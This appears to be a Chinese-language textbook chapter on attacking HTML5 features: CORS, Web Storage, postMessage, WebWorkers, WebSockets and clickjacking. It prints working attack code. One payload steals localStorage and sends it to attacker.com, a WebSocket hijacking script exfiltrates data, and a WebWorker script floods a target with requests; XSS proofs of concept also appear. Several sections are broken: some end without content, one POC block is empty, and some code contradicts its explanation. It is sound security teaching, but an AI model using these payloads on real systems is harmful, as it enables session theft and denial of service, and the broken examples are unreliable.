# 第 12 章 攻击 HTML5

## 12.1 引言

从 HTML4 升级到 HTML5 标志着 Web 技术能力的巨大转变，使开发人员无需依赖 Flash、Silverlight 等插件即可创建动态和交互式内容。

这里必须提及的是，HTML5 不仅仅是一次语言重写升级；它还是许多独立功能的集合。由于复杂性、缺乏采用和安全特性等原因，最初引入的许多功能已被弃用，如 AppCache、WebSQL 等。因此，它们没有被纳入本章。

在本章中，我们将介绍几个众所周知的功能，并讨论可能出现的潜在安全问题。其中一个与几乎所有 HTML5 功能密切相关的漏洞是 DOM XSS。这是因为在 HTML5 应用程序中广泛使用 JavaScript 来提供丰富和动态的内容。

在深入探讨各个功能之前，重要的是要对“同源策略”（SOP）有一个扎实的理解——该策略为不同域之间允许的交互类型设定了规则。由于我们已经在引言章节（第 1 章）中详细解释了 SOP，我们将直接深入探讨跨域资源共享（CORS）。

## 12.2 跨域资源共享（CORS）

随着动态应用程序和 API 的兴起，开发一种安全访问跨域数据的机制变得至关重要，因此 HTML5 引入了 CORS。在此之前，JSONP（带填充的 JSON）、服务器端代理等方法被用来规避 SOP 对访问跨域数据的限制；然而，它们在额外复杂性、性能和安全性方面都有各自的局限性。

CORS 允许服务器指定哪些域被允许执行跨域请求并访问其资源。它通过利用 HTTP 响应头来指示允许访问服务器响应的域来工作。最基本的 CORS 头是响应头“Access-Control-Allow-Origin”，该头可以设置为允许访问服务器响应的域名，也可以设置为通配符“*”，这实际上意味着允许任何域读取响应，这是最常见的 CORS 错误配置之一，可能导致不安全的行为并可能暴露敏感数据。我们将在下一节通过示例探讨此问题：

**图 12.1 浏览器允许具有正确标头值的响应**

类似地，CORS 还有另一个响应头“Access-Control-Allow-Credentials”，当提供时，表示该资源只能在提供凭据的情况下访问，在此上下文中，凭据可以是 Cookie、HTTP 认证等，来自请求源。

**图 12.2 浏览器允许具有正确标头值的响应**

出于安全原因，当“Access-Control-Allow-Origin”头设置为通配符“*”时，不能发送“Access-Control-Allow-Credentials”头，因为这可能允许用户访问经过身份验证的区域，构成重大风险。

### 12.2.1 使用 Origin 头的薄弱访问控制

Origin 头是 CORS 协议的一部分，由浏览器自动添加到 HTTP 请求中。该头指示发起请求的源（协议、主机和端口）。然而，开发人员常犯的一个错误是仅依靠 Origin 进行授权，认为浏览器不允许用户修改 Origin 头。但实际上，请求可以在浏览器外部使用代理、工具或 curl、wget 等命令行工具进行修改。

为了更好地理解，我们来看下面的例子：假设站点 `browsersec.com` 支持 CORS，并向源自 `browsersec.net` 的请求显示敏感信息，而对于来自任何其他域的请求，它仅显示公共的非机密信息。

**代码**
```php
<?php
header("Access-Control-Allow-Origin: https://browsersec.net");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");
header("Access-Control-Allow-Credentials: true");

$sensitiveInfo = "This is sensitive data.";
if (isset($_SERVER['HTTP_ORIGIN']) && $_SERVER['HTTP_ORIGIN'] === "https://browsersec.net") {
    header("Access-Control-Allow-Origin: https://browsersec.net");
    echo $sensitiveInfo;
} else {
    $normalInfo = "This is non-sensitive data.";
    echo $normalInfo;
}
?>
```

通过使用命令行工具（如 curl），我们可以伪造 Origin 头并将其设置为 `browsersec.net`，使服务器认为请求源自此域，从而泄露敏感信息。

**图 12.3 使用 CURL 伪造标头以检索响应**

更安全的代码版本应包括会话管理检查，然后是其他授权检查。

### 12.2.2 CORS 导致 DOM XSS 漏洞

如上一节所述，如果 CORS 配置不正确，它将允许用户绕过 SOP 并读取服务器响应。然而，在某些情况下，CORS 也可能导致 DOM XSS 漏洞。

考虑以下代码作为示例：

**代码：**
```html
<script>
    url = decodeURIComponent(location.hash.substring(1));
    xhr = new XMLHttpRequest();
    xhr.open("GET", url, true);
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4 && xhr.status === 200) {
            var mainElement = document.getElementById("main");
            mainElement.textContent = xhr.responseText;
        }
    };
    xhr.send(null);
</script>
<div id="main"></div>
```

该代码获取通过 `location.hash` 属性指定的 URL，即 URL 中 `#` 之后的所有内容。然后它发送 XHR 请求以加载此 URL 的内容，并将其插入页面的 `<div>` 标签中。该代码还使用 `decodeURIComponent()` 解码内容，然后通过“innerHTML”属性将其注入 DOM，而 `innerHTML` 在嵌入之前不会清理输入。此功能在支持跨域请求的 HTML5 XHR Level 2 出现之前是不可能实现的。

为了利用此漏洞，我们将构造一个指向我们恶意服务器的 URL：

**POC：**
```
http://browsersec.com/#//browsersec.net/cors.php
```

在这种情况下，`cors.php` 将包含以下代码：

```php
<?php header('Access-Control-Allow-Origin: *'); ?>
<div id="main">
    <img src=x onerror=alert(document.domain) />
</div>
```

托管在 `browsersec.net` 的 `cors.php` 文件将设置 CORS 头，并允许任何域获取 `cors.php` 文件的内容，并将其作为 HTML 包含在 div 标签内，从而导致 XSS。

**代码**
```php
<?php header('Access-Control-Allow-Origin: *'); ?>

    <img src=x onerror=alert(document.domain) />
</div>
```

**POC：**
```

```

### 12.2.3 利用开放重定向

防止此攻击的方法之一是使用白名单域；但这明显的问题是，如果这些域中存在开放重定向，则可能导致相同的行为。

考虑以下代码：

**代码**
```javascript
<script>
    var url = destination;
    if (url.indexOf("https://browsersec.com/") == 0 || url.indexOf("https://browsersec.net") == 0) {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", url, true);
    }
</script>
```

该代码检查 URL 是否以 `browsersec.com` 或 `browsersec.net` 开头；如果是，则向该 URL 发起 XHR 请求。这里有两个关键方面值得注意，一是能够加载跨域内容，二是“innerHTML”属性在将内容嵌入 DOM 之前不会清理输入。

## 12.3 Web Storage：概述

Web Storage 是 HTML5 规范，允许客户端应用程序在客户端存储大量数据，从而无需依赖服务器。在此之前，Cookie 是存储数据的地方。每个网站都有其独特的存储空间，并通过同源策略进行分离和隔离。换句话说，一个源上的 Web Storage 无法访问不同源上的数据。

从根本上说，localStorage 主要用于长期存储，并会在浏览器会话之间持久保存，而 sessionStorage 用于临时存储，特定于一个浏览会话；换言之，它会在会话结束时被清除。

### 12.3.1 Session Storage

Session Storage 类似于 Cookie 的概念，并且在存储大小方面相对于 Cookie 的 4KB 限制具有显著优势。它主要用于临时存储，特定于每个浏览会话；换句话说，它不会随 HTTP 请求传输，并且域的每个页面都维护自己独立的 sessionStorage 对象。

根据规范，如果用户使用浏览器功能手动删除存储、用户关闭窗口或应用程序通过 API 调用删除存储，sessionStorage 中的数据将被删除。

### 12.3.2 Local Storage

相比之下，localStorage 用于长期数据存储，会在浏览器会话之间持久保存，并且没有过期日期。即使用户清除浏览器历史记录，数据仍然存在，除非用户明确指定浏览器删除 localStorage 或应用程序通过 API 调用这样做。因此，从安全角度来看，localStorage 尤其值得关注。

### 12.3.3 Session/Local Storage API

localStorage 和 sessionStorage API 都使用键（如“username”）作为唯一标识符来存储、访问和删除数据。数据值指您要存储的数据，如“rafay”。让我们看一下语法：

**添加项**
```javascript
localStorage.setItem('key', 'value');
sessionStorage.setItem('key', 'value');
```

**检索项**
```javascript
localStorage.getItem('Key');
sessionStorage.getItem('Key');
```

**删除项**
```javascript
localStorage.removeItem('key');
sessionStorage.removeItem('key');
```

**删除所有项**
```javascript
localStorage.clear();
sessionStorage.clear();
```

### 12.3.4 HTML5 中 Web Storage 的安全问题

以下是使用 Web Storage API 可能引发的一些安全问题：

- 开发人员可能在 Web Storage 中存储敏感数据，如 Cookie，甚至代码逻辑，从而危及数据的完整性。
- 如果出现 XSS 漏洞，攻击者将能够检索 Web Storage 中的内容。
- 与 Cookie 不同，Web Storage API 没有 HTTPOnly 标志，该标志只允许 HTTP 请求访问 Cookie。因此，如果存在 XSS 漏洞，保存在 Web Storage 中的 Cookie 将导致会话劫持。
- 存储在 Web Storage 中的数据可能被写入易受攻击的汇点，从而导致 DOM XSS 漏洞。

### 12.3.5 会话劫持

如上一节所述，开发人员常犯的一个错误是将 Cookie 等敏感信息存储在 session/localStorage 中，作为 HTTP Cookie 的替代方案。由于 Web Storage 是 Window 对象的属性，因此可以通过 DOM 访问，这加剧了 XSS 漏洞的影响。

例如，以下 JavaScript 有效载荷会从 localStorage 窃取所有数据并将其发送到攻击者的域：

**代码：**
```javascript
<script>
    for (var i in localStorage) {
        var d = new Image();
        d.src = 'http://attacker.com/stealer.php?' + i + '=' + localStorage.getItem(i);
    }
</script>
```

如果是 sessionStorage，攻击者只需将此代码中的 localStorage API 替换为 sessionStorage 即可。

### 12.3.6 使用 Local Storage 的二阶 DOM XSS

如前所述，存储在 localStorage 中的用户控制数据可能最终通过易受攻击的汇点插入，从而导致 DOM XSS。然而，一个可行的利用场景是二阶 XSS，其中来自 URL Fragment 等属性的用户提供数据用于设置 localStorage 中的值，随后被插入到其他地方的易受攻击页面中。让我们看一个真实场景：

**图 12.5 Hackerone 上关于 DOM XSS 的摘要**

一位名为“harisec”的研究人员在 hackerone 上报告了 Twitter 帮助中心网站使用的功能中的一个漏洞 [https://hackerone.com/reports/297968]。该漏洞涉及用于构建面包屑导航的一段 JavaScript 代码。面包屑通常用于导航目的，允许用户跟踪在网站中的位置。位于 `https://help.twitter.com/etc/designs/help-twitter/public/js/homepage.js` 的 JavaScript 代码将当前页面的 URL 保存到 localStorage 中。然后使用该 URL 动态生成面包屑导航。让我们看以下易受攻击的代码：

**代码：**
```javascript
var t = this.lastArticleBreadcrumbs.map(function(t, r) {
    return r === e.lastArticleBreadcrumbs.length - 1
        ? '<a class="hp03__link twtr-type--roman-16" href="' + e.lastArticleHref + '">' + t + "</a>"
        : '<span class="hp03__breadcrumb twtr-color--light-gray-neutral">' + t + "</span>";
});
this.breadcrumbElement.innerHTML = t.join('<span class="hp03__seperator twtr-color--light-gray-neutral">/</span>');
```

以下是易受攻击代码的技术分析：

(i) 变量 `t` 包含 localStorage 键 `lastArticleBreadcrumbs`，其中保存了用户访问过的页面。
(ii) 在该函数中，另一个键 `e.lastArticleHref` 保存了用户访问的最后一页的 URL。
(iii) 接下来，使用 `join` 方法将最后页面的列表拼接成一个字符串。
(iv) 最后，该字符串被赋值给 `this.breadcrumbElement.innerHTML` 属性，将其添加到 HTML 中。

显然，这里的漏洞在于，如果访问过的页面列表（即用户访问过的链接）通过 innerHTML 属性直接插入 DOM，将导致 DOM XSS。为了利用此漏洞，攻击者只需确保受害者访问以下页面即可：

**POC：**
```
https://help.twitter.com/en/using-twitter/follow-requests#"><script>alert(1);</script>
```

该链接将被存储为 localStorage 变量 `lastArticleHref` 中最后访问的 URL。由于 URL 包含我们的 XSS 有效载荷，当受害者导航到任何页面时，上述包含 URL Fragment 中 XSS 有效载荷的链接将被添加到 HTML 中，从而触发 XSS。

不幸的是，对于发现此漏洞的研究人员来说，Twitter 实施了内容安全策略（CSP），因此影响被降低，赏金并不大。

值得注意的是，大多数现代浏览器会自动编码 URL Fragment 部分之后的特殊字符；然而，你可能会遇到内容在渲染到网页之前应被解码的情况。

## 12.4 IndexedDB 漏洞

IndexedDB 可用于构建离线工作且连接性低的应用程序，例如将数据存储在 IndexedDB 中的新闻应用程序，允许在地铁隧道和连接不稳定或不存在的偏远地区访问数据。

虽然 localStorage 也可用于本地存储数据，但其限制通常为 5MB，而 IndexedDB 的存储限制要高得多，仅受用户硬盘空间限制，使其成为需要大量数据存储的离线应用程序的理想解决方案。类似地，localStorage 在处理结构化数据方面效率不高，且数据的完整性得不到保证。

本质上，IndexedDB 是一个位于客户端浏览器中的 NoSQL 数据库。与使用表关系的关系型数据库（如 MySQL、PostgreSQL）不同，IndexedDB 中的数据以对象形式存储，并使用索引（也称为“键”）进行数据检索。

另一个名为“WebSQL”的类似功能曾作为 HTML5 的一部分引入；然而，自 2010 年以来它已被弃用，因此相关性降低。

从安全角度来看，IndexedDB 的主要风险之一是 XSS。让我们看一下 IndexedDB 导致二阶 XSS 的场景。

### 12.4.1 场景——笔记应用程序

## 12.5 Web Messaging 攻击场景

Web Messaging 的引入是为了允许来自不同源的框架和弹出窗口能够相互通信。在 HTML5 之前，SOP 施加了严格的障碍，不同源上的窗口无法相互通信。因此，开发人员不得不采用复杂的变通方法，如 URL Fragment 标识符、Cookie 等来实现此类交互。HTML5 引入了 postMessage API，提供结构化、无缝且安全的跨源通信机制。让我们看一个示例。

### 12.5.1 发送方窗口

要向 `browsersec.com` 上的窗口发送消息，您需要提供两个参数：要发送的消息和目标域名。

**代码**
```javascript
window.postMessage("message", "https://browsersec.com");
```

### 12.5.2 接收方窗口

在 `browsersec.com` 的接收方窗口中，我们需要设置一个监听器来验证消息的来源。如果消息来源通过验证，脚本将发送一条确认消息回消息发送窗口。

**代码**
```javascript
window.addEventListener("message", receiveMessage, false);
function receiveMessage(event) {
    if (event.origin !== "https://browsersec.com") { // 验证来源
        return;
    } else {
        event.source.postMessage("Message received", event.origin);
    }
}
```

该代码在将响应发送回来源之前，验证消息确实来自 `https://browsersec.com`。

### 12.5.3 安全问题

以下是你在处理 postMessage API 调用时可能遇到的一些安全问题：

### 12.5.4 未在 PostMessage API 中验证来源

与 postMessage API 相关的一个常见陷阱是接收窗口不验证消息的来源。这种缺乏验证可能无意中允许来自不受信任来源的消息，从而导致潜在的安全漏洞，如 DOM XSS、数据泄露和客户端拒绝服务（DoS）。让我们看一个示例：

**代码**
```javascript
window.addEventListener("message", receiveMessage, false);
function receiveMessage(event) {
    event.source.postMessage("Message received");
}
```

在此代码中，接收窗口代码接受并响应消息，而不验证来源。

### 12.5.5 PostMessage API 中的 DOM XSS

你在野外最常遇到的漏洞是 DOM XSS。如果从 postMessage 接收到的数据通过 innerHTML、document.write 等汇点传递，就会发生这种情况。

让我们从一个 HTML5 postMessage 实现中的真实示例来演示此漏洞的实际效果 [https://robertnyman.com/2010/03/18/postmessage-in-html5-to-send-messages-between-windows-and-iframes/]，[https://robertnyman.com/html5/postMessage/postMessage.html]。让我们分析易受攻击的代码：

**代码：发送方窗口**
```javascript
window.onload = function() {
    var iframeWin = document.getElementById("da-iframe").contentWindow,
        form = document.getElementById("the-form"),
        myMessage = document.getElementById("my-message");
    myMessage.select();
    form.onsubmit = function() {
```

## 12.6 WebWorkers 漏洞

在 HTML5 之前，JavaScript 和 DOM 在单个线程上运行，这使得它对于需要并发性和高处理速度的任务效率低下，并且经常导致页面在脚本执行完成之前无响应。HTML5 中引入的 WebWorkers 功能通过允许 JavaScript 在单独的线程上运行而不干扰当前页面，解决了此问题。

然而，WebWorkers 无法访问 DOM。如果它们可以访问，将导致并发问题，从而产生不一致性。尽管如此，它们可以使用 XHR 在同一域内或跨不同源执行请求。

主线程和 WebWorker 之间的通信通过 postMessage API 进行。`postMessage` 方法用于向 WebWorker 发送数据，而 `onmessage` 方法用于接收来自 WebWorker 的数据。这使得 WebWorkers 能够在后台执行任务，而不会破坏当前页面的响应能力。让我们看看如何创建 WebWorker：

以下代码片段将创建一个 WebWorker，在单独的线程上运行名为“worker.js”的文件：

**代码**
```javascript
var w = new Worker("worker.js");
```

位于同一目录下的 `worker.js` 文件旨在从主线程接收数据，并使用 postMessage 调用将其发送回去。

**代码：**
```javascript
onmessage = function(event) {
    var Data = event.data; // 此处，我们将来自主线程的数据存储在 'Data' 中。
    postMessage(Data); // 然后我们将此数据发送回主线程。
};
```

### 12.6.1 与 WebWorker 交互

现在让我们检查如何与 WebWorker 交互。我们将使用 postMessage 调用向 WebWorker 发送数据。数据由 WebWorker 处理，并使用 `onmessage` 事件处理程序发送回去。让我们看以下代码：

**易受攻击的代码**
```html
<script>

    worker.postMessage("foo"); // 此处我们将脚本 'foo' 发送到 WebWorker。
    worker.onmessage = function(evt) { // 从 worker.js 接收数据的函数
        document.getElementById("result").innerText = evt.data; // 输出接收到的数据。
    }
</script>
<p><strong>Data received from Web Worker:</strong></p>
<div id="result"></div>
```

在此代码中，消息“foo”被发送到 worker。worker 将其发送回来，输出显示在 DIV HTML 元素中。以下截图展示了从 WebWorker 接收到的数据：

### 12.6.2 WebWorker DOM XSS

考虑一种情况，来自 WebWorker 的不受信任代码由主线程使用易受攻击的汇点（如 `eval()`、`document.write()`、`innerHTML` 等）处理。这可能导致 DOM XSS。以下是易受攻击代码的示例：

**易受攻击的代码**
```javascript
var worker = new Worker("worker.js");
worker.postMessage("foo");
worker.onmessage = function(evt) {
    document.getElementById("result").innerHTML = evt.data;
}
```

在此代码中，从 `worker.js` 文件接收到的 `evt.data` 使用 innerHTML 属性写入 DOM。虽然必须强调这种直接场景在实际应用程序中并不常见，但让我们探索一个更合理的场景，以更好地理解风险。让我们检查以下代码：

**代码**
```javascript
var g_w = new XMLHttpRequest();
g_w.open("GET", "https://weatherapi.com/get_weather.php");
g_w.send();
g_w.onreadystatechange = function() {
    if (g_w.readyState == 4) {
        if (JSON.parse(g_w.responseText).temperature > 30) {
            postMessage(g_w.responseText);
        }
    }
}
```

此脚本向托管在 `weatherapi.com` 上的 `get_weather.php` 文件发送 XHR 请求。该文件以 JSON 格式返回天气数据。然后代码检查返回的温度是否高于 30°C；如果是，脚本则使用 postMessage 调用将响应发送到主线程。

现在，想象如果攻击者入侵了 `weatherapi.com`。他们可以操纵响应中返回给 XHR 的 `get_weather.php` 内容。主线程接收 JSON 对象，并使用易受攻击的函数将其插入响应中。在这种情况下，可能导致存储型 DOM XSS 漏洞。然而，根据代码逻辑，这也可能导致 SQL 注入、数据泄露甚至远程代码执行漏洞。

### 12.6.3 使用 WebWorkers 进行分布式拒绝服务攻击

由于 WebWorkers 可用于发送跨域请求，因此可用于执行 DDOS 攻击。此类攻击者的思路是使用多个 WebWorker，每个发送多个跨域请求到目标域。这里必须提及的是，攻击者不关心从目标源收到的响应，因为这取决于 CORS 设置。

考虑到这一因素，在一个假设场景中，控制僵尸网络的攻击者可以运行一个脚本，创建多个 worker，每个向目标发送大量流量。由于每个僵尸都有不同的 IP 地址，传统的 IP 速率限制等方法将难以奏效。

然而，这里必须提及的是，现代浏览器已经实现了安全功能来限制 WebWorkers 的潜在滥用。此外，由于 CORS，WebWorkers 跨域读取响应的能力受到限制，除非服务器明确允许。让我们看一个示例脚本：

**代码**
```html
<script>
    var w = new Worker('DOS.js');
    w.onmessage = function(event) {
        document.getElementById('out').innerText = event.data;
    };
    function start() {
        w.postMessage(1);
    }
</script>
<input type="submit" onclick="start()">
<div id="out"></div>
```

此脚本在后台创建了一个名为“DOS.js”的 worker。从 `event.data` 接收到的响应被写入 DOM，使其能够显示在网页上。

`DOS.js` 文件包含一个运行 5000 次的 while 循环，每次迭代都会向目标域发送一个跨域请求。

**代码**
```javascript
onmessage = function(event) {
    start();
};
function start() {
    var i = 0;
    var st = (new Date).getTime();
    while (i < 5000) {
        var cor = new XMLHttpRequest();
        i++;
        cor.open('GET', 'http://targetfordos.com');
        cor.send();
    }
    msg = "Completed " + i + " requests in " + (st - (new Date).getTime()) + " milliseconds";
    postMessage(msg);
}
```

此特定问题并非 WebWorker 本身的漏洞；然而，它更多地可以被视为设计缺陷。在 HTML5 之前，JavaScript 不被视为破解密码的合适选择，因为它在单线程上运行。这种限制可能导致在反复尝试破解密码哈希时浏览器冻结。

## 12.7 WebSockets

HTTP 在请求/响应模型上运行，客户端向服务器发送请求，服务器在关闭连接之前向客户端响应所请求的数据。对于后续通信，会发起包含相关头部和 Cookie 数据的新请求。这会产生开销并引入延迟。

为了克服此限制，WebSocket API 作为 HTML5 规范的一部分被引入。WebSocket 在客户端和服务器之间创建了一个全双工持久连接，实现实时双向通信。因此，消除了重复握手的需要，显著减少了开销，使其成为需要即时更新的应用程序（如聊天、游戏、在线拍卖、投注等）的合适选择。

与 HTTP 协议相比，WebSocket 具有更高的连接限制。过去，开发人员依赖 Keep-Alive 头来保持与 HTTP 的开放连接，这减少了为每个请求创建新连接的开销。然而，这种方法也有其局限性，因为客户端发送请求，服务器等待响应，从而引入了延迟。

WebSocket 协议以 HTTP 握手开始。以下是请求/响应的示例：

**请求**
```
GET /chat HTTP/1.1
Host: example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: nXbCfEq65gawqYPL2p6vDeU9GQ==
```

在客户端请求中，我们发送了“Upgrade: websocket”和“Connection: Upgrade”。如果服务器支持 WebSocket，它将把 HTTP 连接升级为 WebSocket 并发送响应。

**响应**
```
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: aE3pPwrqrqwrDa7snBtksakrwqrrI=
```

### 12.7.1 WebSocket DOM XSS

### 12.7.2 跨站 WebSocket 劫持（CSWH）

在从 HTTP 升级到 WebSocket 的握手过程中，HTTP 协议将所有认证数据转发给 WebSocket。对于容易受到跨站 WebSocket 劫持攻击的应用程序，应满足以下条件：

- 目标应用程序在初始握手期间不验证 Origin 头。
- 应用程序依赖 Cookie 进行身份验证。
- 应用程序不使用 CSRF（跨站请求伪造）令牌。
- 应用程序不使用 SameSite Cookie。

CSWH 类似于 CSRF 攻击；然而，一个主要区别是，与 CSRF 中攻击者可以代表用户伪造请求不同，CSWH 还允许攻击者从 WebSocket 伪造读取信息。尤其是如果使用 Cookie 进行身份验证且未验证 Origin 头，它们使用用户拥有的相同会话。它可能将消息解释为来自合法客户端并相应地处理，从而导致 CSWH。

例如，来自 `https://attacker.com` 上的恶意页面尝试连接到 `wss://vulnerable.com/chat` 的 WebSocket 握手请求看起来像：

**请求**
```
GET /chat HTTP/1.1
Host: vulnerablesite.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
Sec-WebSocket-Version: 13
Origin: https://attacker.com
Cookie: JsessionID=abc123
```

**响应：**
```
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=
```

这里必须提及的是，WebSocket Key 被服务器用来确认其是否可以解析 WebSocket 连接，并不能防止 CSWH 攻击。

以下脚本将托管在 `attacker.com`。一旦加载到受害者的浏览器中，它将建立与 `vulnerable.com` 的 WebSocket 连接。对于 `vulnerable.com`，消息似乎来自 `attacker.com`，因为它没有验证请求的来源。当 `vulnerable.com` 响应请求时，脚本将数据记录到 `attacker.com/logs`。

**代码：**
```javascript
<script>
    (function() {
        var ws = new WebSocket("wss://vulnerable.com/chat");
        ws.onopen = function() {
            ws.send("malicious data");
        };
        ws.onmessage = function(event) {
            // 使用 XHR 将接收到的数据发送到攻击者的服务器。
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "https://attacker.com/log", true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify({ data: event.data }));
        };
    })();
</script>
```

### 12.7.3 WebSocket 和未加密连接

WebSocket 协议允许通过未加密和加密通道建立连接。根据规范，WebSocket 协议定义了两个方案，“ws”作为未加密通道，“wss”作为加密通道。如果实现依赖于未加密通道，可能允许本地网络上的攻击者拦截和操纵流量。

## 12.8 UI 重新定向攻击

UI 重新定向是一个术语，涵盖了多种攻击技术，包括点击劫持（clickjacking）、点赞劫持（likejacking）和击键劫持（strokejacking）。其中，点击劫持最为普遍。这些攻击利用了默认情况下可以将网页加载到 iframe 中的能力。过去，曾使用“framebusting”代码来防止网页被加载到 iframe 中。然而，这些被证明是不够的，并被“X-Frame-Options”头所取代，现在大多数现代浏览器都已实现。

Web 应用程序通过响应头部署“X-Frame-Options”头来利用此安全措施。当设置为“deny”（X-Frame-Options: deny）时，它阻止浏览器将网页加载到任何框架中。或者，当头包含“Same Origin”时，意味着只有来自同源的网站才被允许框住该页面。

一旦网页被加载到 iframe 中，攻击者可以使用 HTML 和 CSS 将看似无害的页面放置在 iframe 之上。此覆盖层隐藏了被框住网页的内容，使其对受害者不可见。此外，该页面的设计在当前页面上精心放置了 HTML 元素，如按钮、表单或超链接。

通过使用 CSS，iframe 被设置为透明，使覆盖层看起来与当前页面无缝集成。这些元素的定位方式使得任何用户交互（如点击或表单提交）都不会影响覆盖层上可见的 HTML 元素。相反，这些操作被巧妙地重定向到底层不可见的 iframe 网页，该网页已加载了易受攻击的应用程序。

```css
    z-index: 10; /* 降低的 z-index 值 */
    opacity: 60%; /* 将不透明度设置为 0 */
}
.iframe-container iframe {
    width: 100%;
    height: 105%;
    border: 0;
}
```
